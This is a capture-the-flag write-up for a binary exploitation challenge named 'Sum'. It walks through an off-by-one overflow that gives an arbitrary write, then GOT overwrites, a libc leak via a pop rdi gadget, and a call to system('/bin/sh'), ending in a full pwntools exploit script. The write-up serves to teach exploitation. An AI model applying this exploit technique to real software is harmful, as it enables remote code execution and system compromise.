# Sum (pwn)  
Let's look at the binary  
![image](https://github.com/user-attachments/assets/0d1b0a5c-9e2c-4474-86e6-208820bf90fc)  

And if we run it  
![image](https://github.com/user-attachments/assets/bf9e3764-7b6b-460b-9e0a-86e2c490fdbc)  
It seems to just add up the numbers and then add them up.  

Let's look at the binary in Ghidra to see what is really going on.  


![image](https://github.com/user-attachments/assets/6752ed72-95d9-4ab5-9367-555556810a2a)  

Ok, nothing special going on in the main function. Let's check out `sum()` and `read_ints()`.  
```c

void read_ints(long buf,long nRead)

{
  long lVar1;
  int iVar2;
  long in_FS_OFFSET;
  long i;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
                    /* you can actually do 6 writes */
  for (i = 0; i <= nRead; i = i + 1) {
    iVar2 = __isoc99_scanf(&longlongdecimal,buf + i * 8);
    if (iVar2 != 1) {
                    /* WARNING: Subroutine does not return */
      exit(-1);
    }
    if (*(long *)(buf + i * 8) == 0) break;
  }
  if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}


int sum(long buf,long *ctr)

{
  long lVar1;
  long in_FS_OFFSET;
  int i;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  *ctr = 0;
  i = 0;
  while (*(long *)(buf + (long)i * 8) != 0) {
    *ctr = *(long *)(buf + (long)i * 8) + *ctr;
    i = i + 1;
  }
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return i;
}
```

Ok, so you might notice that due to the `<=` in `read_ints` we can actually read 6 long long integers into our array of 5 integers.  
Cool, lets look into this further.  
First, since there is no zero will `sum()` end? Inspecting in GDB shows that there will always be a zero after our sixth write, so we are good in that sense.  
Also, the main function will `exit(-1)` if we sum more than five integers.  
Now ... the important part is the following:  
![image](https://github.com/user-attachments/assets/737331d4-bb60-46ad-98ae-7c4a5578d092)  
The thing we overflow into, is the pointer that we pass into the `sum()` function.  
Therefore we can control the memory address that we are writing the sum of our values to.  
Nice! Let's ignore the `exit()` issue for a second and try to get this write primitive to work.  

We can wite to `addr` by sending `x1` `x2` `x3` `x4` `x5` `addr`, and the value that we write will be `x1+x2+x3+x4+x5+addr`.  
Now, since `addr` might be big, something we might want to do is an integer overflow so that we can write values smaller than `addr`.  
Since we can only write `long long int`, then we will make `x1+x2+addr` equal 0 (after the overflow) and then we can send `1` `1` and `val-2` where `val` is the value that we need to write.  
Therefore our sum will be equal to `val` after the integer overflow.

```python
def write(addr, value, io = r):
        max_long = 0x10000000000000000 
        max_longlongint = 0x7fffffffffffffff
        complement = max_long - addr - max_longlongint 
        written = value - 2 
        io.sendline(str(complement).encode()) #complement + addr + max_longlongint = 0
        for i in range(2):
            io.sendline(str(1).encode()) #we need 6 total writes to trigger exit
        io.sendline(str(max_longlongint).encode()) # since the largest number we can use is max long long int we need this
        io.sendline(str(written).encode()) #we send what we want to write-2 due to the extra writes
        io.sendline(str(addr).encode()) #overwrite address of the accumulator
```
Sweet! Now what do we do about the `exit()`?  
We can actually do something that will help us twofold. If we overwrite the got entry for exit with the main function, that means we will get another write every time we trigger the `exit()`.  
After doing that we have infinite writes.  

Turning this into a shell might take some tricks tho. We could either do a ROPchain and use a stack pivot gadget to execute it, or we could get a libc leak and do a return to system.  
I don't know which one was easier but I decided to take the second route.  
In the `main` function, if we don't trigger `exit` we call `printf`. We can use our write primitive to overwrite the `printf` got entry with anything we want.  
It just so happens that the stack looks like the follwing right before printf:
```
| return addr |
|     x1      |
|     x2      |
     ...
```
That means that if instead of `printf` we executed `pop reg; ret`, we would return to the address pointer by x1.  
We can abuse this to get a libc leak.  
Since this binary has No PIE, we can use the old trick of `puts(puts@got)`, which will print the contents of the GOT entry for `puts` i.e. the address of puts in libc.  
```python
# 0x0000000000400a43: pop rdi; ret;
    pop_rdi_ret = 0x400a43
    write(exe.got.printf, pop_rdi_ret)

    #libc leak
    r.clean()
    r.sendline(str(pop_rdi_ret).encode())
    r.sendline(str(exe.got.puts).encode())
    r.sendline(str(exe.sym.puts).encode()) #call puts(&puts)
    r.sendline(str(0x4009a7).encode()) #call exit
    r.sendline(b"0")
    leak = int.from_bytes(r.recvline()[:-1],'little')
    log.success(hex(leak))
```
Something to notice here is that we DONT want to trigger `exit()` so that `printf` happens. Therefore we also need to manually call exit so that we can keep writing.  
After that we can use the same technique to call `system("/bin/sh")`.  

All together:  
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("sum_ccafa40ee6a5a675341787636292bf3c84d17264_patched")
libc = ELF("libc.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    r = process([exe.path])
    if args.DEBUG:
        gdb.attach(r)

    return r

def main():
    r = conn()

    def write(addr, value, io = r):
        max_long = 0x10000000000000000 
        max_longlongint = 0x7fffffffffffffff
        complement = max_long - addr - max_longlongint 
        written = value - 2 
        io.sendline(str(complement).encode()) #complement + addr + max_longlongint = 0
        for i in range(2):
            io.sendline(str(1).encode()) #we need 6 total writes to trigger exit
        io.sendline(str(max_longlongint).encode()) # since the largest number we can use is max long long int we need this
        io.sendline(str(written).encode()) #we send what we want to write-2 due to the extra writes
        io.sendline(str(addr).encode()) #overwrite address of the accumulator
    #    log.info(hex(complement+2+written+addr+max_longlongint))

    #gdb.attach(r)
    exit_got = exe.got.exit #0x601048
    main_addr = exe.sym.main

    #if we write the address of main into the got of exit
    # we can loop back to main by triggering the exit which we can do if we do 6 total writes 
    write(exit_got, main_addr)

    # now we have infinite writes 
    
    # 0x0000000000400a43: pop rdi; ret;
    pop_rdi_ret = 0x400a43
    write(exe.got.printf, pop_rdi_ret)

    #libc leak
    r.clean()
    r.sendline(str(pop_rdi_ret).encode())
    r.sendline(str(exe.got.puts).encode())
    r.sendline(str(exe.sym.puts).encode()) #call puts(&puts)
    r.sendline(str(0x4009a7).encode()) #call exit
    r.sendline(b"0")
    leak = int.from_bytes(r.recvline()[:-1],'little')
    log.success(hex(leak))

    #return to libc
    libc.address = leak - libc.sym.puts
    log.success(hex(libc.address))
    binsh = next(libc.search(b'/bin/sh'))
    r.sendline(str(pop_rdi_ret).encode())
    r.sendline(str(binsh).encode())
    r.sendline(str(libc.sym.system).encode())
    r.sendline(b"0")

    r.interactive()


if __name__ == "__main__":
    main()
```
![image](https://github.com/user-attachments/assets/eb394a2e-da35-4937-95ad-412d6959dd62)

